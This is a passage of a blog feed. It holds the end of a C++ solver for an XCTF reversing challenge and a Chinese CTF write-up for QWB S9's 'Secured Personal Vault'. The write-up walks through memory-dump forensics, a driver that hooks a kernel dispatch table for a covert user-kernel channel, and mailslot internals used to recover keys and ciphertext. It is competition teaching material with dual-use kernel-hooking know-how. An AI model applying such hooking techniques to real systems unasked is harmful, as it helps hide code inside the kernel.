class="number">0x91</span>,<span class="number">0x0f</span>,<span class="number">0x86</span>,<span class="number">0x6d</span>,<span class="number">0x40</span>,<span class="number">0xc6</span> &#125;;</span><br><span class="line">    <span class="built_in">decrypt</span>(input); <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) input[i] ^= xorkey8[i];</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> xorkey7[]&#123; <span class="number">0xdd</span>,<span class="number">0xf6</span>,<span class="number">0x83</span>,<span class="number">0x62</span>,<span class="number">0x12</span>,<span class="number">0x66</span>,<span class="number">0x7d</span>,<span class="number">0xca</span>,<span class="number">0x2e</span>,<span class="number">0xca</span>,<span class="number">0x13</span>,<span class="number">0x93</span>,<span class="number">0xa7</span>,<span class="number">0x3e</span>,<span class="number">0x55</span>,<span class="number">0xab</span>,<span class="number">0x23</span>,<span class="number">0x7f</span>,<span class="number">0xe2</span>,<span class="number">0x92</span>,<span class="number">0xe6</span>,<span class="number">0x78</span>,<span class="number">0xb7</span>,<span class="number">0xbb</span>,<span class="number">0x3d</span>,<span class="number">0xe9</span>,<span class="number">0x7f</span>,<span class="number">0x44</span>,<span class="number">0x35</span>,<span class="number">0x6e</span>,<span class="number">0x89</span>,<span class="number">0xc2</span> &#125;;</span><br><span class="line">    <span class="built_in">aes_decrypt_128</span>(aes_key, input, input); <span class="built_in">aes_decrypt_128</span>(aes_key, input + <span class="number">16</span>, input + <span class="number">16</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) input[i] ^= xorkey7[i];</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> xorkey6[]&#123; <span class="number">0xa0</span>,<span class="number">0x90</span>,<span class="number">0xf8</span>,<span class="number">0x5f</span>,<span class="number">0x29</span>,<span class="number">0x1c</span>,<span class="number">0x5b</span>,<span class="number">0xb8</span>,<span class="number">0x7c</span>,<span class="number">0xad</span>,<span class="number">0x04</span>,<span class="number">0x6b</span>,<span class="number">0xe7</span>,<span class="number">0xfa</span>,<span class="number">0xba</span>,<span class="number">0x82</span>,<span class="number">0xe7</span>,<span class="number">0x48</span>,<span class="number">0x38</span>,<span class="number">0xb0</span>,<span class="number">0x1f</span>,<span class="number">0xce</span>,<span class="number">0xe7</span>,<span class="number">0xc8</span>,<span class="number">0x8d</span>,<span class="number">0x1d</span>,<span class="number">0xfb</span>,<span class="number">0x21</span>,<span class="number">0x8c</span>,<span class="number">0x5d</span>,<span class="number">0x87</span>,<span class="number">0xa6</span> &#125;;</span><br><span class="line">    <span class="built_in">decrypt</span>(input); <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) input[i] ^= xorkey6[i];</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> xorkey5[]&#123; <span class="number">0x35</span>,<span class="number">0xfb</span>,<span class="number">0x03</span>,<span class="number">0x2b</span>,<span class="number">0x9e</span>,<span class="number">0x9c</span>,<span class="number">0x1a</span>,<span class="number">0x27</span>,<span class="number">0x6f</span>,<span class="number">0x5a</span>,<span class="number">0x5d</span>,<span class="number">0x24</span>,<span class="number">0x0b</span>,<span class="number">0x26</span>,<span class="number">0xac</span>,<span class="number">0x83</span>,<span class="number">0x67</span>,<span class="number">0x60</span>,<span class="number">0xaf</span>,<span class="number">0x19</span>,<span class="number">0x00</span>,<span class="number">0xf8</span>,<span class="number">0x00</span>,<span class="number">0xe0</span>,<span class="number">0xf2</span>,<span class="number">0xc0</span>,<span class="number">0xa7</span>,<span class="number">0xde</span>,<span class="number">0x22</span>,<span class="number">0xa9</span>,<span class="number">0x53</span>,<span class="number">0xa1</span> &#125;;</span><br><span class="line">    <span class="built_in">aes_decrypt_128</span>(aes_key, input, input); <span class="built_in">aes_decrypt_128</span>(aes_key, input + <span class="number">16</span>, input + <span class="number">16</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) input[i] ^= xorkey5[i];</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> xorkey4[]&#123; <span class="number">0x00</span>,<span class="number">0x8c</span>,<span class="number">0xcd</span>,<span class="number">0x2e</span>,<span class="number">0x90</span>,<span class="number">0xb8</span>,<span class="number">0x00</span>,<span class="number">0x8a</span>,<span class="number">0x62</span>,<span class="number">0xd3</span>,<span class="number">0x00</span>,<span class="number">0xbf</span>,<span class="number">0xcd</span>,<span class="number">0x32</span>,<span class="number">0x43</span>,<span class="number">0xfe</span>,<span class="number">0xed</span>,<span class="number">0xb6</span>,<span class="number">0xb2</span>,<span class="number">0xcc</span>,<span class="number">0xf1</span>,<span class="number">0xc3</span>,<span class="number">0x00</span>,<span class="number">0x5c</span>,<span class="number">0xa2</span>,<span class="number">0xa0</span>,<span class="number">0x00</span>,<span class="number">0xa5</span>,<span class="number">0x2d</span>,<span class="number">0xc4</span>,<span class="number">0x3e</span>,<span class="number">0x64</span> &#125;;</span><br><span class="line">    <span class="built_in">decrypt</span>(input); <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) input[i] ^= xorkey4[i];</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> xorkey3[]&#123; <span class="number">0xe9</span>,<span class="number">0x81</span>,<span class="number">0x88</span>,<span class="number">0xfc</span>,<span class="number">0x58</span>,<span class="number">0xd1</span>,<span class="number">0x1b</span>,<span class="number">0xe9</span>,<span class="number">0x21</span>,<span class="number">0x24</span>,<span class="number">0x64</span>,<span class="number">0x04</span>,<span class="number">0x29</span>,<span class="number">0x6f</span>,<span class="number">0x27</span>,<span class="number">0xaf</span>,<span class="number">0x7d</span>,<span class="number">0x4a</span>,<span class="number">0xad</span>,<span class="number">0xd6</span>,<span class="number">0x81</span>,<span class="number">0x11</span>,<span class="number">0xfa</span>,<span class="number">0x00</span>,<span class="number">0xe5</span>,<span class="number">0x6e</span>,<span class="number">0x00</span>,<span class="number">0xc8</span>,<span class="number">0xa5</span>,<span class="number">0x7c</span>,<span class="number">0x82</span>,<span class="number">0xf2</span> &#125;;</span><br><span class="line">    <span class="built_in">decrypt</span>(input); <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) input[i] ^= xorkey3[i];</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> xorkey2[]&#123; <span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0xb0</span>,<span class="number">0xcf</span>,<span class="number">0x4c</span>,<span class="number">0xed</span>,<span class="number">0x0e</span>,<span class="number">0xc1</span>,<span class="number">0x60</span>,<span class="number">0x00</span>,<span class="number">0xf2</span>,<span class="number">0xf8</span>,<span class="number">0x00</span>,<span class="number">0x3a</span>,<span class="number">0x35</span>,<span class="number">0xf2</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x61</span>,<span class="number">0xdc</span>,<span class="number">0xa1</span>,<span class="number">0x48</span>,<span class="number">0xe8</span>,<span class="number">0xde</span>,<span class="number">0x00</span>,<span class="number">0x53</span>,<span class="number">0x00</span>,<span class="number">0xf8</span>,<span class="number">0x00</span>,<span class="number">0x90</span>,<span class="number">0xa3</span>,<span class="number">0x4d</span> &#125;;</span><br><span class="line">    <span class="built_in">decrypt</span>(input); <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) input[i] ^= xorkey2[i];</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> xorkey1[]&#123; <span class="number">0x0c</span>,<span class="number">0xa2</span>,<span class="number">0xd9</span>,<span class="number">0xf7</span>,<span class="number">0x95</span>,<span class="number">0x66</span>,<span class="number">0xa9</span>,<span class="number">0x0b</span>,<span class="number">0x35</span>,<span class="number">0xe9</span>,<span class="number">0x20</span>,<span class="number">0x09</span>,<span class="number">0x08</span>,<span class="number">0xda</span>,<span class="number">0x39</span>,<span class="number">0xff</span>,<span class="number">0x9f</span>,<span class="number">0x73</span>,<span class="number">0xc8</span>,<span class="number">0xa7</span>,<span class="number">0x07</span>,<span class="number">0x97</span>,<span class="number">0x55</span>,<span class="number">0xd9</span>,<span class="number">0x9c</span>,<span class="number">0xb3</span>,<span class="number">0x76</span>,<span class="number">0x88</span>,<span class="number">0x7d</span>,<span class="number">0x33</span>,<span class="number">0xa7</span>,<span class="number">0x0c</span> &#125;;</span><br><span class="line">    <span class="built_in">decrypt</span>(input); <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) input[i] ^= xorkey1[i];</span><br><span class="line"></span><br><span class="line">    std::<span class="built_in">reverse</span>(input, input + <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.32s\n&quot;</span>, input);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;XCTF-Final-FlagChecker&quot;&gt;&lt;a href=&quot;#XCTF-Final-FlagChecker&quot; class=&quot;headerlink&quot; title=&quot;XCTF Final FlagChecker&quot;&gt;&lt;/a&gt;XCTF Final FlagCheck</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>强网杯S9 Secured Personal Vault WP</title>
    <link href="https://tkazer.github.io/2025/10/22/QWBS9-Secured-Personal-Vault/"/>
    <id>https://tkazer.github.io/2025/10/22/QWBS9-Secured-Personal-Vault/</id>
    <published>2025-10-22T10:21:16.000Z</published>
    <updated>2025-10-22T15:46:56.472Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Secured-Personal-Vault"><a href="#Secured-Personal-Vault" class="headerlink" title="Secured Personal Vault"></a>Secured Personal Vault</h1><h2 id="题目考点"><a href="#题目考点" class="headerlink" title="题目考点"></a>题目考点</h2><p>取证、进程&amp;驱动逆向、msfs.sys逆向、Mailslot结构逆向</p><h2 id="0x1-取证阶段"><a href="#0x1-取证阶段" class="headerlink" title="0x1 取证阶段"></a>0x1 取证阶段</h2><p>下载题目附件，得到MEMORY.DMP，是Windows的系统转储文件格式，使用Windbg打开该文件。</p><p>点击<code>!analyze -v</code>，进行dmp分析。</p><p><img src="/2025/10/22/QWBS9-Secured-Personal-Vault/image.png" alt="alt text"></p><p>可以发现系统是触发了蓝屏，并且能看到蓝屏时保存的栈信息，是由<code>aPersonalVault+0x2a4b</code>开始调用，然后到最后<code>personalVaultKernel+0x10f5</code>代码触发蓝屏。</p><p><img src="/2025/10/22/QWBS9-Secured-Personal-Vault/image-1.png" alt="alt text"></p><p>跳转到触发蓝屏的汇编代码，可以看到是xor清零了eax，然后后续又访问了[rax]，导致空指针异常。</p><p><img src="/2025/10/22/QWBS9-Secured-Personal-Vault/image-2.png" alt="alt text"></p><p>可以看到起始Call是在<code>aPersonalVault.exe</code>进程中，而触发蓝屏异常的是<code>personalVaultKernel.sys</code>，所以接下来就是Dump转储这两个文件进行分析。</p><p><img src="/2025/10/22/QWBS9-Secured-Personal-Vault/image-3.png" alt="alt text"></p><p>使用<code>!process 0 0</code>命令遍历当前所有进程，发现当前运行的是存在两个<code>aPersonalVault.exe</code>进程。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PROCESS ffffef063fbe8080</span><br><span class="line">    SessionId: none  Cid: 0fa8    Peb: 9f83185000  ParentCid: 14b0</span><br><span class="line">    DirBase: 840fe000  ObjectTable: ffffa687a7241740  HandleCount: 161.</span><br><span class="line">    Image: aPersonalVault.exe</span><br><span class="line"></span><br><span class="line">PROCESS ffffef063fbc1080</span><br><span class="line">    SessionId: none  Cid: 26f0    Peb: 9216e1a000  ParentCid: 14b0</span><br><span class="line">    DirBase: 1296dc000  ObjectTable: ffffa687a6dd3b40  HandleCount: 165.</span><br><span class="line">    Image: aPersonalVault.exe</span><br></pre></td></tr></table></figure><p><img src="/2025/10/22/QWBS9-Secured-Personal-Vault/image-4.png" alt="alt text"></p><p>直接通过Windbg的<code>.writemem</code>指令发现无法转储成功完整的进程和sys，所以尝试使用Volatility3进行直接原文件转储。</p><p>使用Volatility3命令<code>python .\vol.py -f .\MEMORY.DMP windows.filescan</code>遍历所有文件，找到对应的几个文件的地址，再使用<code>python .\vol.py -f .\MEMORY.DMP windows.dumpfiles --virtaddr 地址</code>进行转储即可得到原始文件。</p><p><img src="/2025/10/22/QWBS9-Secured-Personal-Vault/image-5.png" alt="alt text"></p><h2 id="0x2-逆向阶段"><a href="#0x2-逆向阶段" class="headerlink" title="0x2 逆向阶段"></a>0x2 逆向阶段</h2><h3 id="1-R0驱动逆向分析"><a href="#1-R0驱动逆向分析" class="headerlink" title="1. R0驱动逆向分析"></a>1. R0驱动逆向分析</h3><p>找到关键入口点函数，发现这边是遍历了进程，寻找<code>ntoskrnl.exe</code>，获取到<code>HalPrivateDispatchTable</code>函数表，最后将函数表中的<code>HalTimerConvertAuxiliaryCounterToPerformanceCounter</code>替换成<code>sub_1400010A0</code>，并且获取到全局进程表保存起来。</p><p><img src="/2025/10/22/QWBS9-Secured-Personal-Vault/image-7.png" alt="alt text"></p><p>这边提前提一下R3进程的部分代码，实际是驱动将该函数进行Hook，将<code>NtConvertBetweenAuxiliaryCounterAndPerformanceCounter</code>作为R3-R0通信函数，通信数据的结构通过R3代码可以分析出来。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">ComData</span></span><br><span class="line">&#123;</span><br><span class="line">    DWORD MagicNum;</span><br><span class="line">    DWORD Signal;</span><br><span class="line">    DWORD64 Pid;</span><br><span class="line">    DWORD64 RetData;</span><br><span class="line">    CHAR PAD[<span class="number">216</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2025/10/22/QWBS9-Secured-Personal-Vault/image-9.png" alt="alt text"></p><p>R0这边Hook替换的函数分析，可以看到Signal如果是1就会触发蓝屏部分代码，Signal为2则遍历进程链表，寻找R3通信传来的对应Pid的EProcess，然后获取CreateTime数据返回到R3。</p><p><img src="/2025/10/22/QWBS9-Secured-Personal-Vault/image-8.png" alt="alt text"></p><p>上文EPROCESS结构通过Windbg的<code>dt nt!_EPROCESS</code>命令可以获得，可以通过偏移知道代码中实际对应是什么数据，若在0x1cb偏移前，则再需要<code>dt nt!_KPROCESS</code>，获取第一部分的结构。</p><p><img src="/2025/10/22/QWBS9-Secured-Personal-Vault/image-10.png" alt="alt text"></p><p><img src="/2025/10/22/QWBS9-Secured-Personal-Vault/image-11.png" alt="alt text"></p><p>实际用到的只有如下数据：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_EPROCESS</span></span><br><span class="line">&#123;</span><br><span class="line">    CHAR PAD[<span class="number">464</span>];</span><br><span class="line">    DWORD64 UniqueProcessId;        <span class="comment">// 0x1d0</span></span><br><span class="line">    LIST_ENTRY *ActiveProcessLinks; <span class="comment">// 0x1d8</span></span><br><span class="line">    CHAR PAD2[<span class="number">24</span>];</span><br><span class="line">    DWORD64 CreateTime;             <span class="comment">// 0x1f8</span></span><br><span class="line">    <span class="type">char</span> PAD3[<span class="number">1552</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>至此R0驱动程序分析完毕。</p><h3 id="2-R3程序逆向分析"><a href="#2-R3程序逆向分析" class="headerlink" title="2. R3程序逆向分析"></a>2. R3程序逆向分析</h3><p>main函数创建了一个窗口，并且获取了<code>NtConvertBetweenAuxiliaryCounterAndPerformanceCounter</code>函数作为通信函数使用，下一步分析WndProc函数。</p><p><img src="/2025/10/22/QWBS9-Secured-Personal-Vault/image-6.png" alt="alt text"></p><p>存在两个输入框以及按钮，按下<code>Create</code>按钮则会获取输入的用户名以及Secret。</p><p><img src="/2025/10/22/QWBS9-Secured-Personal-Vault/image-12.png" alt="alt text"></p><h4 id="加密流程分析"><a href="#加密流程分析" class="headerlink" title="加密流程分析"></a>加密流程分析</h4><p>调用该函数与R0驱动进行通信，传递Signal是2，传过去的Pid是<code>GetCurrentProcessId</code>，也就是当前进程ID，驱动会返回当前进程的<code>CreateTime</code>数据。</p><p>然后调用BCryptGenRandom随机初始化一个48字节的pbBuffer，用于后续的加密使用。</p><p><img src="/2025/10/22/QWBS9-Secured-Personal-Vault/image-13.png" alt="alt text"></p><p>下面这部分是将随机的48字节作为两部分使用，前32字节作为Key，后16字节作为IV，对用户输入的Secret进行AES-CBC加密。</p><p><img src="/2025/10/22/QWBS9-Secured-Personal-Vault/image-14.png" alt="alt text"></p><p>加密完，将48字节异或上驱动返回的<code>CreateTime</code>数据，加密了密钥和IV。</p><p><img src="/2025/10/22/QWBS9-Secured-Personal-Vault/image-15.png" alt="alt text"></p><p>将输入的用户名进行Hash加密，作为<code>Mailslot</code>路径名和<strong>映射空间名</strong>的后缀，调用<code>CreateMailslotA</code>创建一个邮槽并将返回句柄存在全局的hObject内存位置，将加密的密文写入到邮槽中，再创建一个内存映射，将句柄保存的内存地址进行映射。</p><p><img src="/2025/10/22/QWBS9-Secured-Personal-Vault/image-16.png" alt="alt text"></p><h4 id="什么是邮件槽"><a href="#什么是邮件槽" class="headerlink" title="什么是邮件槽"></a>什么是邮件槽</h4><p>邮槽（MailSlot）是Windows提供的一种单向进程间通信机制，只由客户端向服务端单向发送数据。特点是单向通信以及广播通信。</p><p>流程：</p><ol><li>客户端通过CreateMailslotA创建一个邮槽对象。</li><li>客户端通过WriteFile函数写入消息到邮槽中。</li><li>服务端通过CreateMailslot创建邮槽，并读取相应数据。</li></ol><p>命名格式是”.\mailslot\路径名”</p><p>由于邮槽是有自己的一个数据储存结构，后续会对这点进行逆向分析。</p><h4 id="解密流程分析"><a href="#解密流程分析" class="headerlink" title="解密流程分析"></a>解密流程分析</h4><p>点击<code>Check Secret</code>按钮，会调用以下部分代码。</p><p>获取当前的用户名，然后将用户名Hash作为映射空间名后缀，打开刚刚同用户名创建邮槽数据时映射的内存，拿到hObject数据，也就是Mailslot的句柄，再调用<code>GetMailslotInfo</code>获取邮槽中的数据大小，调用<code>ReadFile</code>获取邮槽中的密文数据。</p><p><img src="/2025/10/22/QWBS9-Secured-Personal-Vault/image-20.png" alt="alt text"></p><p>与R0驱动进程通信再次获取当前进程的<code>CreateTime</code>数据，异或解密刚刚被异或加密的pbBuffer，也就是（Key+IV）共48字节数据。</p><p><img src="/2025/10/22/QWBS9-Secured-Personal-Vault/image-18.png" alt="alt text"></p><p>使用解密的Key和IV对刚刚获取的密文进行AES-CBC解密，与加密是对称的，解密完毕后又将（Key+IV）48字节异或<code>CreateTime</code>进行数据加密。</p><p><img src="/2025/10/22/QWBS9-Secured-Personal-Vault/image-19.png" alt="alt text"></p><p>最后红框处将解密文本与窗口输入的Secret文本进行比对，若匹配则弹出”Secret”信息框，不匹配则调用下面部分代码。</p><p>打开对应用户名的邮槽对象，将当前解密的数据写回邮槽中，并且设置Signal为1，与R0驱动进行通信，也就触发了R0驱动的那个[0]地址赋值异常，触发蓝屏。</p><p><img src="/2025/10/22/QWBS9-Secured-Personal-Vault/image-24.png" alt="alt text"></p><h3 id="3-题目流程分析"><a href="#3-题目流程分析" class="headerlink" title="3. 题目流程分析"></a>3. 题目流程分析</h3><p>已知题目DMP附件是由于驱动触发蓝屏时转储的，驱动触发蓝屏原因是：R3程序请求用户名获取的对应密文，解密后不匹配当前窗口中的Secret。</p><p>而取证阶段，我们通过<code>!process 0 0</code>遍历进程发现了存在两个<code>aPersonalVault.exe</code>，所以会存在一种情况造成蓝屏：</p><p>两个进程分别通过不同的原用户名创建了两份邮槽储存密文，然后其中一个进程误输错用户名，访问了另一个进程的邮槽，获取到了不是属于他密钥加密的密文，自然也无法解密出明文数据，比对失败后则通信Signal为1的消息，触发蓝屏。</p><p>整体流程：</p><ol><li><p>两个进程分别用生成的不同随机密钥加密了两份Secret，储存到了两个邮槽当中。</p></li><li><p>进程1通过错误用户名访问到了进程2的邮槽，使用进程1的密钥进行了数据解密，匹配失败，将解密后数据写回到进程2的邮槽中，然后触发蓝屏。</p></li></ol><p>逆向流程：</p><ol><li><p>获取两个进程中被加密的48字节（Key+IV）数据，然后再获取两个进程的<code>CreateTime</code>，将48字节和<code>CreateTime</code>进行异或得到两份AES的密钥和IV。</p></li><li><p>获取两个进程创建的邮槽中的密文数据。</p></li><li><p>进程1的密文是可以直接通过进程1的密钥和IV进行AES-CBC解密出明文1。</p></li><li><p>进程2的密文由于被进程1解密过一次，并且重写覆盖到邮槽数据中，所以需要先使用进程1的密钥和IV进行AES-CBC加密一次，再用进程2的密钥和IV进行AES-CBC解密，最终得到明文2.</p></li></ol><p>所以可以直接提取两个进程的被加密的（Key+IV），以及各自的<code>CreateTime</code>，从而解密出原始的两份（Key+IV）。</p><p>以及最重要的是接下来需要分析邮槽相关API以及数据结构，从而提取两份密文。</p><h3 id="4-密钥提取"><a href="#4-密钥提取" class="headerlink" title="4. 密钥提取"></a>4. 密钥提取</h3><p>可以从R3程序找到（Key+IV）储存的偏移，即<code>exe+0x26BA8</code></p><p><img src="/2025/10/22/QWBS9-Secured-Personal-Vault/image-25.png" alt="alt text"></p><p>以下是刚刚遍历得到的两个进程数据，Eprocess分别是ffffef063fbe8080、ffffef063fbc1080。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PROCESS ffffef063fbe8080</span><br><span class="line">    SessionId: none  Cid: 0fa8    Peb: 9f83185000  ParentCid: 14b0</span><br><span class="line">    DirBase: 840fe000  ObjectTable: ffffa687a7241740  HandleCount: 161.</span><br><span class="line">    Image: aPersonalVault.exe</span><br><span class="line"></span><br><span class="line">PROCESS ffffef063fbc1080</span><br><span class="line">    SessionId: none  Cid: 26f0    Peb: 9216e1a000  ParentCid: 14b0</span><br><span class="line">    DirBase: 1296dc000  ObjectTable: ffffa687a6dd3b40  HandleCount: 165.</span><br><span class="line">    Image: aPersonalVault.exe</span><br></pre></td></tr></table></figure><p>需要先使用<code>.process /r /p Eprocess地址</code>，切换到对应进程，才能通过当前进程Base地址+偏移读取到目标程序中的数据。</p><p><img src="/2025/10/22/QWBS9-Secured-Personal-Vault/image-26.png" alt="alt text"></p><p>再通过<code>lm vm aPersonalVault</code>命令查看进程模块信息，获取到进程基地址，两个进程都是同一个基地址，所以需要切换进程才能访问对应进程的数据。</p><p><img src="/2025/10/22/QWBS9-Secured-Personal-Vault/image-27.png" alt="alt text"></p><p><code>db 00007ff611d10000+0x26BA8</code>查询字节，得到48字节被加密的（Key+IV），切换到另一个进程同样操作，即可以得到两份被加密的（Key+IV）。</p><p><img src="/2025/10/22/QWBS9-Secured-Personal-Vault/image-28.png" alt="alt text"></p><p><img src="/2025/10/22/QWBS9-Secured-Personal-Vault/image-29.png" alt="alt text"></p><p>可以使用<code>.writemem C:\Users\admin\Desktop\Key_and_IV.dat 00007ff611d36ba8 L30</code>命令导出目标地址0x30长度的字节到文件中。</p><h3 id="5-进程CreateTime获取"><a href="#5-进程CreateTime获取" class="headerlink" title="5. 进程CreateTime获取"></a>5. 进程CreateTime获取</h3><p>通过获取到的两个进程的Eprocess地址，转成_EPROCESS结构查看，即可找到CreateTime数据。</p><p><code>dt nt!_EPROCESS ffffef063fbe8080</code></p><p><img src="/2025/10/22/QWBS9-Secured-Personal-Vault/image-48.png" alt="alt text"></p><p><img src="/2025/10/22/QWBS9-Secured-Personal-Vault/image-49.png" alt="alt text"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x01dc3fe6ed454439</span><br><span class="line">0x01dc3fe6f02a77eb</span><br></pre></td></tr></table></figure><h3 id="6-邮槽逆向分析"><a href="#6-邮槽逆向分析" class="headerlink" title="6. 邮槽逆向分析"></a>6. 邮槽逆向分析</h3><h4 id="前置分析"><a href="#前置分析" class="headerlink" title="前置分析"></a>前置分析</h4><p>注意到R3程序创建邮槽的句柄是保存在自身进程的全局地址中，所以可以直接像上文提取密钥相关数据一样操作，切换进程，读取对应偏移数据，得到两个进程的邮槽句柄。</p><p><img src="/2025/10/22/QWBS9-Secured-Personal-Vault/image-30.png" alt="alt text"></p><p><img src="/2025/10/22/QWBS9-Secured-Personal-Vault/image-31.png" alt="alt text"></p><p>获取到两个句柄分别是0x27C和0x280。</p><p>ffffef063fbc1080:</p><p><img src="/2025/10/22/QWBS9-Secured-Personal-Vault/image-34.png" alt="alt text"></p><p>ffffef063fbe8080:</p><p><img src="/2025/10/22/QWBS9-Secured-Personal-Vault/image-33.png" alt="alt text"></p><p>使用<code>!handle 27c f ffffef063fbc1080</code>命令获取该进程0x27C句柄的信息。</p><p>可以看到Name是<code>\mailslot_e60a23e2</code>，也就是R3看到的创建的邮槽的名字，后面的是用户名的Hash值，Object地址是<code>ffffe70b7f057380</code>。</p><p><img src="/2025/10/22/QWBS9-Secured-Personal-Vault/image-35.png" alt="alt text"></p><p>此类型的句柄都是_FILE_OBJECT结构类型，使用<code>dt nt!_FILE_OBJECT ffffe70b7f057380</code>将目标地址转成指定结构查看。</p><p><img src="/2025/10/22/QWBS9-Secured-Personal-Vault/image-36.png" alt="alt text"></p><p>点击DeviceObject，发现设备是Msfs驱动，也就是msfs.sys，是Windows R0层控制邮槽操作的驱动，所以接下来就对msfs.sys进行逆向分析。</p><p><img src="/2025/10/22/QWBS9-Secured-Personal-Vault/image-37.png" alt="alt text"></p><h4 id="msfs-sys逆向分析"><a href="#msfs-sys逆向分析" class="headerlink" title="msfs.sys逆向分析"></a>msfs.sys逆向分析</h4><p>由于从DMP中Dump出来的msfs.sys IAT有点小问题，所以这边使用自己主机中的msfs.sys进行逆向分析。</p><p>DriverEntry函数，这边初始化了各种IRP函数，主要看的是ReadFile对应回调的MsFsdRead，R3层通过ReadFile获取邮槽中的数据，因为只需要获取到邮槽中的数据，所以只需要分析MsFsdRead函数，得到邮槽结构，即可寻址找到邮槽数据。</p><p><img src="/2025/10/22/QWBS9-Secured-Personal-Vault/image-39.png" alt="alt text"></p><p>MsFsdRead调用了MsCommonRead，然后再调用了MsReadDataQueue，先从当前的邮槽FileObject获取FsContext指针，加上0x88传入函数。</p><p>后续UserBuffer和Length就是要返回的数据指针以及读取大小。</p><p><img src="/2025/10/22/QWBS9-Secured-Personal-Vault/image-41.png" alt="alt text"></p><p>可以从memcpy的传参返回去看，可以找到对应的数据指针以及数据长度的寻址计算方法，所以就可以通过上文得到的两个FileObject地址，寻址找到两个邮槽密文数据，以及数据长度。</p><p><code>pData = *(void**)(*(QWORD*)(FileObject-&gt;FsContext + 0x88 + 0x18) - 8 + 0x28)</code></p><p><code>Datalength = *(DWORD*)(*(QWORD*)(FileObject-&gt;FsContext + 0x88 + 0x18) - 8 + 0x20)</code></p><p><img src="/2025/10/22/QWBS9-Secured-Personal-Vault/image-42.png" alt="alt text"></p><p>注意一点，上面是对主机的msfs.sys进行逆向分析，不是目标DMP系统中的msfs.sys，所以相关偏移可能不太一样，需要同样使用Volatility3进行Dump出msfs.sys，用ida分析。</p><p>发现这边实际是<code>FsContext+0x118</code>，并且MsReadDataQueue内的的寻址是和上文一致，只需要修改FsContext添加的偏移即可。</p><p><img src="/2025/10/22/QWBS9-Secured-Personal-Vault/image-43.png" alt="alt text"></p><p><img src="/2025/10/22/QWBS9-Secured-Personal-Vault/image-44.png" alt="alt text"></p><p>最终数据和数据长度寻址如下：</p><p><code>pData = *(void**)(*(QWORD*)(FileObject-&gt;FsContext + 0x118 + 0x18) - 8 + 0x28)</code></p><p><code>Datalength = *(DWORD*)(*(QWORD*)(FileObject-&gt;FsContext + 0x118 + 0x18) - 8 + 0x20)</code></p><h3 id="7-密文提取"><a href="#7-密文提取" class="headerlink" title="7. 密文提取"></a>7. 密文提取</h3><p>通过上文获取的两个邮槽的FileObject，获取FsContext，寻址得到邮槽数据以及数据长度。</p><p><img src="/2025/10/22/QWBS9-Secured-Personal-Vault/image-46.png" alt="alt text"></p><p>Eprocess ffffef063fbc1080:</p><p><img src="/2025/10/22/QWBS9-Secured-Personal-Vault/image-45.png" alt="alt text"></p><p>Eprocess ffffef063fbe8080:</p><p><img src="/2025/10/22/QWBS9-Secured-Personal-Vault/image-47.png" alt="alt text"></p><p>使用命令导出密文到文件即可。</p><p><code>.writemem C:\Users\admin\Desktop\EncData_1.dat ffffa687a5efa7a8 L80</code></p><p><code>.writemem C:\Users\admin\Desktop\EncData_2.dat ffffa687a8d145d8 L50</code></p><h2 id="0x3-解密"><a href="#0x3-解密" class="headerlink" title="0x3 解密"></a>0x3 